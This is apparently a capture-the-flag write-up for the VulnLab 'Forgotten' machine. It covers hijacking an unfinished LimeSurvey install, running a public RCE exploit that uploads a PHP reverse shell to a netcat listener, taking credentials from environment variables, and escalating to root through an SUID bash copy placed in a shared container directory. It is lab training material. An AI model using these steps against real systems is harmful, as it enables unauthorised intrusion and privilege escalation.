# Forgotten

Hello Friends,

Remo is Back

In this write-up, I’ll walk through how I pwned the **Forgotten** machine from **VulnLab**. From initial enumeration to gaining root access, I’ll explain the key steps, tools, and techniques used to complete the box.

![image.png](../images/forgotten-banner.png)

Let’s start by scanning the machine.

```bash
sudo nmap -sC -sV -sS -O -A -oN scanned.txt -p 22,80 --min-rate=1000 10.10.120.62
```

![image.png](../images/forgotten.png)

now let’s check the website running on port 80.

![image.png](../images/forgotten%201.png)

and we got forbidden so let’s now fuzz for directories.

```bash
feroxbuster --url http://10.10.120.62/
```

![image.png](../images/forgotten%202.png)

we got an endpoint named survey so let’s go to the website and see it

![image.png](../images/forgotten%203.png)

as we see there is a website named LimeSurvey running on the port 80 so let’s search for a public exploit for it.

Now let’s try to install it.

![image.png](../images/forgotten%204.png)

notice that we need a database to complete the installation.

so let’s create a database using a docker container

```bash
sudo docker run --name limesurvey -e MYSQL_ROOT_PASSWORD=remoremo -e MYSQL_DATABASE=limesurvey -e MYSQL_USER=lime -e MYSQL_PASSWORD=remoremo -p 3306:3306 -d mysql:latest
```

![image.png](../images/forgotten%205.png)

now let’s try to connect to the database.

![image.png](../images/forgotten%206.png)

now let’s continue to the next step

![image.png](../images/forgotten%207.png)

now let’s populate the database and set the admin password to remoremo

![image.png](../images/forgotten%208.png)

now let’s login as the administrator

![image.png](../images/forgotten%209.png)

after we got everything ready let’s search for a CVE in limeSurvey

![image.png](../images/forgotten%2010.png)

and we got RCE let’s get it and edit the php reverse shell IP and port

![image.png](../images/forgotten%2011.png)

now let’s make this reverse shell as a zip file

```bash
zip N4s1rl1.zip config.xml revshell.php
```

![image.png](../images/forgotten%2012.png)

now let’s open a listener on our machine

```bash
nc -lvnp 1337
```

![image.png](../images/forgotten%2013.png)

Now let’s run our exploit.

```bash
python3 exploit.py http://10.10.120.62/survey admin remoremo 80
```

![image.png](../images/forgotten%2014.png)

now let’s check our listner

![image.png](../images/forgotten%2015.png)

now let’s type hostname to check the environment 

```bash
hostname
```

![image.png](../images/forgotten%2016.png)

and we are in a docker container so let’s run env

```bash
env
```

![image.png](../images/forgotten%2017.png)

and we found limesurvey password so let’s connect to the user limesvc via ssh 

```bash
ssh limesvc@10.10.120.62
```

![image.png](../images/forgotten%2018.png)

and we broke out of the container now let’s see the user flag.

![image.png](../images/forgotten%2019.png)

Now let’s go back to our container and switch to root.

![image.png](../images/forgotten%2020.png)

now in the container copy the bash and add the SUID binary to it.

```bash
cp /bin/bash .;chmod +s bash
```

![image.png](../images/forgotten%2021.png)

now let’s go back to the main host and list the container files.

```bash
cd /opt/limesurvey ; ls -las
```

![image.png](../images/forgotten%2022.png)

notice that we got a root with the SUID binary set to it so now let’s go and get root assess

```bash
./bash -p
```

![image.png](../images/forgotten%2023.png)

now let’s go to the root directory and list the flag

```bash
cd /root ; ls -las
```

![image.png](../images/forgotten%2024.png)

and I did it we got the root flag!

![image.png](../images/forgotten%2025.png)

That’s it for the **Forgotten** machine! This challenge was a great test of enumeration and exploitation skills. Hope you found the write-up useful.
